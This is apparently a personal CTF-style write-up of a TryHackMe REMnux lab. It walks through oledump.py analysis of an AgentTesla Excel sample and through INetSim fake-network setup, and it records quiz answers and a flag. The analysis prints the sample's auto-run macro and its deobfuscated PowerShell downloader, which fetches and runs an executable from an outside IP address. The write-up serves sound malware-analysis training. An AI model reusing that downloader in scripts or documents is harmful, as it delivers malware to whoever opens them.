| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **REMnux: Getting Started** |

# REMnux: Getting Started

## Contents
- [Introduction](#introduction)
- [Machine Access](#machine-access)
- [File Analysis](#file-analysis)
- [Fake Network to Aid Analysis](#fake-network-to-aid-analysis)


## 📘Introduction

Remnux is a specialist Linux disto, built specifically for analysing malware. It includes tools, not limited to:
- Volatility
- YARA
- Wireshark
- oledump
- INetSim



## 📘Machine Access

Not much to say here, start the machine and have at it.

Files can be found under `~/Desktop/tasks`



## 📘File Analysis

In this task, we're looking at **static analysis**. 

Fire up the **Terminal Emulator** on the Desktop

Navigate to `~/Desktop/tasks/agenttesla/`.

```Shell
ubuntu@ip-10-10-153-147:~$ cd ~/Desktop/tasks/agenttesla/
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$
```

We want to run `oledump.py` against `agenttesla.xlsm`

```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

Thankfully it doesn't take long to run.

It looks like we have 4 _VBA scripts_ within the sheet.
- `Sheet1`
- `ThisWorkbook`
- `_VBA_PROJECT`
- `dir`

The **`A`** followed the number represents the data stream, so here we have 6 data streams.

A data stream with a **`M`** represents a macro, a peice of code that can be executed within the host application, in this case Excel.

Our **`M`** of interest is on data stream 4. So lets target this for more info.

This time suffix the previous command with `-s 4` (**select** stream 4.


```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V
00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = "Thi.s
00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k"....Ba
00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-
00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|
00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..
00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl
00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id
00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru.."Expose..
00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri
000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..
000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O
000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt
000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s
000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc
000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,
00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^
00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^
00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 57  *h..l^*.l* *^-*W
00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S
00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.
00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA
00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o
00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 61 73  l^icy..b.*yp^^as
00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  s *;* $.MFi.lA.=
00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..
000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..
000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.
000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $
000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$
000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..
000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke
00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est 
00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i ""http.:/
00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/
00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf
00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ...."" -.c*.'.4.
00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s
00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., 
00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h"*"..".}..^I..e
00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw("WSc
00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....
000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..
```

**_Not sure if the above formatted correctly_**

We can (_hopfully_) see that the result is in hex. 

Reading through the readable text we can see some key Excel macro key words such as `Sub`, `Dim` etc.

It looks though it is invoking a web request through an ip. Potentially a malicious PDF file.

We can again suffix the command, this time with `--vbadecompress` So lets issue this command and see what we end up with.

```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
End Sub
```

This is much more telling, we a string that is obsfucated with `*` and `^` and then a nice replace to remove them both. The command will then be sent to WScript.

So we can use CyberChef to 'decode' it

Navigate to [CyberChef](https://cyberchef.io/)

Copy the inital value of `Sqtnew` and paste it into the CyberChef Input.

Under the **Operations** perform a search for `replace`. Drag **``Find / Replace** in to the **Recipe** twice.

In the first one, type `^` and change **`REGEX`** with **SIMPLE STRING`**.

Do the same on the second, only type `*` instead.

This will leave you with the following string in the **Output**

```Text
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;
```


### ❓ Question 1

> What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?

#### 🧪 Process

We're using the tool `oledump.py`

Trying this as the answer

#### ✅ Answer

- `oledump.py` ✅


### ❓ Question 2

> What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?

#### 🧪 Process

We used `-s` for select followed by the number of the stream.

Trying this as the answer

#### ✅ Answer

- `-s` ✅


### ❓ Question 3

> During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?

#### 🧪 Process

I usually use `Invoke-WebRequest` along with the url or `-uri` of the file I want to download.

Trying this as the answer

#### ✅ Answer

- `Invoke-WebRequest` ✅


### ❓ Question 4

> What file was being downloaded using the PowerShell script?

#### 🧪 Process

After de-obsfucating we found the file was called `Doc-3737122pdf.exe`

Trying this as the answer

#### ✅ Answer

- `Doc-3737122pdf.exe` ✅


### ❓ Question 5

> During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?

#### 🧪 Process

I'm not sure, the variable was `$TempFile`, but this linked to `[IO.Path]::GetTempFileName()` but since I've never used this object in PowerShell I'm not sure what `GetTempFileName()` returns.

I'll go with `$TempFile` and see where that gets me.

Trying this as the answer

#### ✅ Answer

- `$TempFile` ✅


### ❓ Question 6

> Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. How many data streams were presented for this file?

#### 🧪 Process

See question 7, messed process ;). The answer is `16`

Trying this as the answer

#### ✅ Answer

- `16` ✅


### ❓ Question 7

> Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. At what data stream number does the tool indicate a macro present?

#### 🧪 Process

Returning to the VM. 

Type `oledump.py` and double tap _`tab`_ to show all options. 

Since we're after `possible_malicious.docx` we can suffix that. This results in the following

```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py possible_malicious.docx 
  1:       114 '\x01CompObj'
  2:       280 '\x05DocumentSummaryInformation'
  3:       416 '\x05SummaryInformation'
  4:      7557 '1Table'
  5:    343998 'Data'
  6:       376 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M 1989192 'Macros/VBA/ThisDocument'
  9:      4099 'Macros/VBA/_VBA_PROJECT'
 10:       515 'Macros/VBA/dir'
 11:       112 'ObjectPool/_1649178531/\x01CompObj'
 12:        16 'ObjectPool/_1649178531/\x03OCXNAME'
 13:         6 'ObjectPool/_1649178531/\x03ObjInfo'
 14:        86 'ObjectPool/_1649178531/f'
 15:         0 'ObjectPool/_1649178531/o'
 16:      4096 'WordDocument'
```

Since we're after which data stream may ontain the malicious code, I think we can safely say that is stream **`8`**.

Trying this as the answer

#### ✅ Answer

- `8` ✅



## 📘Fake Network to Aid Analysis

So we have downloaded some malware we want to analyse, we could just do this in our Windows box and hope we have some safeguards in place. Or we can use REMnux to help us out. The REMux VM has a tool called **INetSim: Internet Services Simulation Suite!**



### INetSim

First we need to update the `inetsim.conf` file with the current IP of the **`REMnux_gettingstarted_v7`** VM

Fire up the **Terminal Emulator** 

Take note of the IP address.

```Shell
ubuntu@ip-10-10-161-121:~$ 
```

So we know our IP is `10.10.161.121`. Lets fire up the config file.

```Shell
ubuntu@ip-10-10-161-121:~$ sudo vim /etc/inetsim/inetsim.conf 
```

Tap `/` followed by `dns_default` and press **Return**

drop down to `#dns_default_ip...`

Remove the `#` and update the IP address with the correct ip. the line should look like.

_**Note**: You'll need to tap `i` to enter insert mode_

```shell
dns_default_ip 10.10.161.121
```

Press **Esc** and type `:x` to save and exit

Next we want to grep the file to make sure it has saved and is the correct IP

```Shell
ubuntu@ip-10-10-161-121:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip <IP address>
dns_default_ip 10.10.161.121	 
```

Now we can start _INetSim_ by issuing `sudo inetsim`

```Shell
ubuntu@ip-10-10-161-121:~$ sudo inetsim
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Warning: Unknown option '/var/log/inetsim/report/report.104162.txt#start_service' in configuration file '/etc/inetsim/inetsim.conf' line 43
Configuration file parsed successfully.
=== INetSim main process started (PID 2259) ===
Session ID:     2259
Listening on:   0.0.0.0
Real Date/Time: 2025-07-06 20:16:26
Fake Date/Time: 2025-07-06 20:16:26 (Delta: 0 seconds)
 Forking services...
Couldn't create UDP socket: Address already in use at /usr/share/perl5/INetSim/DNS.pm line 36.
  * dns_53_tcp_udp - started (PID 2264)
  * smtp_25_tcp - started (PID 2267)
  * smtps_465_tcp - started (PID 2268)
  * ftp_21_tcp - started (PID 2271)
  * pop3_110_tcp - started (PID 2269)
  * pop3s_995_tcp - started (PID 2270)
  * ftps_990_tcp - started (PID 2272)
  * https_443_tcp - started (PID 2266)
  * http_80_tcp - failed!
 done.
Simulation running.
```

We can ignore the **`failed!`** under **`http_80_tcp`**.

Let's head over to the other VM.

Fire up **FireFox**

Navigate to the IP of the _REMux VM_ (https://10.10.161.121)

We'll need to click **Advanced...** followed by **Accept the Risk and Continue**.

We're met with a note about the default HTML page etc.

We're told to try and download `second_payload.zip`.

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/second_payload.zip --no-check-certificate
--2025-07-06 21:36:47--  https://10.10.161.121/second_payload.zip
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.zip\u2019

second_payload.zip         100%[======================================>]     258  --.-KB/s    in 0s      

2025-07-06 21:36:47 (10.7 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]
```

Let's try another file, `second_payload.ps1`

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/second_payload.ps1 --no-check-certificate
--2025-07-06 21:42:06--  https://10.10.161.121/second_payload.ps1
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.ps1\u2019

second_payload.ps1         100%[======================================>]     258  --.-KB/s    in 0s      

2025-07-06 21:42:06 (2.35 MB/s) - \u2018second_payload.ps1\u2019 saved [258/258]
```

Interesting if we cat the file, what do we see here...

```Shell
root@ip-10-10-182-45:~# cat second_payload.ps1 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
```

I think it is safe to say it will be the same for the `second_payload.zip` file we downlaoded downloaded earlier.

```Shell
root@ip-10-10-182-45:~# cat second_payload.zip 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
```

I'm curious, what if I give the `wget` a different `random.file` name.

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/random.file --no-check-certificate
--2025-07-06 21:46:40--  https://10.10.161.121/random.file
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018random.file\u2019

random.file                100%[======================================>]     258  --.-KB/s    in 0s      

2025-07-06 21:46:40 (11.0 MB/s) - \u2018random.file\u2019 saved [258/258]
```

When we `cat` it, we alread know the result

```Shell
root@ip-10-10-182-45:~# cat random.file 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
```

So we know what is happening now, what ever we `wget` we are served the home page in what ever format is provided.

Let's drop back to the **REMnux[...]** VM.

Fire up a new **Terminal Emulator**

We want to `cat` the _inetsim_ log. 

Well it looks like the logs are not being updated correctly. So here is a sample from THM.

```Shell
ubuntu@10.10.161.121:~$ sudo cat /var/log/inetsim/report/report.2594.txt
=== Report for session '2594' ===

Real start date            : 2024-09-22 21:04:42
Simulated start date       : 2024-09-22 21:04:42
Time difference on startup : none

2024-09-22 21:04:53  First simulated date in log file
2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.10.161.121/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.10.161.121/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe
2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  Last simulated date in log file
===
```


### ❓ Question 1

> Download and scan the file named **flag.txt** from the terminal using the command `sudo wget https://10.10.161.121/flag.txt --no-check-certificate`. What is the flag?

#### 🧪 Process

Back on the AttackBox

We need to `wget` the flag.

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/flag.txt --no-check-certificate; cat flag.txt
--2025-07-06 22:03:02--  https://10.10.161.121/flag.txt
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 151 [text/plain]
Saving to: \u2018flag.txt\u2019

flag.txt                   100%[======================================>]     151  --.-KB/s    in 0s      

2025-07-06 22:03:02 (7.01 MB/s) - \u2018flag.txt\u2019 saved [151/151]


This is the default text document for INetSim HTTP server fake mode.

This file is plain text.

You found it! The flag is = Tryhackme{remnux_edition}
```

We've got `Tryhackme{remnux_edition}`

Trying this as the answer


#### ✅ Answer

- `Tryhackme{remnux_edition}` ✅



### ❓ Question 2

> After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?

#### 🧪 Process

Oh, I see, I didn't realise it was generated post exit. 

```Shell
Simulation stopped.
 Report written to '/var/log/inetsim/report/report.2259.txt' (16 lines)
=== INetSim main process stopped (PID 2259) ===
```

Lets cat out '/var/log/inetsim/report/report.2259.txt'

```Shell
ubuntu@ip-10-10-161-121:~$ sudo cat /var/log/inetsim/report/report.2259.txt 
=== Report for session '2259' ===

Real start date            : 2025-07-06 20:16:26
Simulated start date       : 2025-07-06 20:16:26
Time difference on startup : none

2025-07-06 20:22:11  First simulated date in log file
2025-07-06 20:22:11  HTTPS connection, method: GET, URL: https://10.10.161.121/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 20:22:12  HTTPS connection, method: GET, URL: https://10.10.161.121/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
2025-07-06 20:36:46  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 20:42:06  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 20:46:39  HTTPS connection, method: GET, URL: https://10.10.161.121/random.file, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 21:03:01  HTTPS connection, method: GET, URL: https://10.10.161.121/flag.txt, file name: /var/lib/inetsim/http/fakefiles/sample.txt
2025-07-06 21:03:01  Last simulated date in log file

===
```

The method was `GET`

Trying this as the answer

#### ✅ Answer

- `GET` ✅
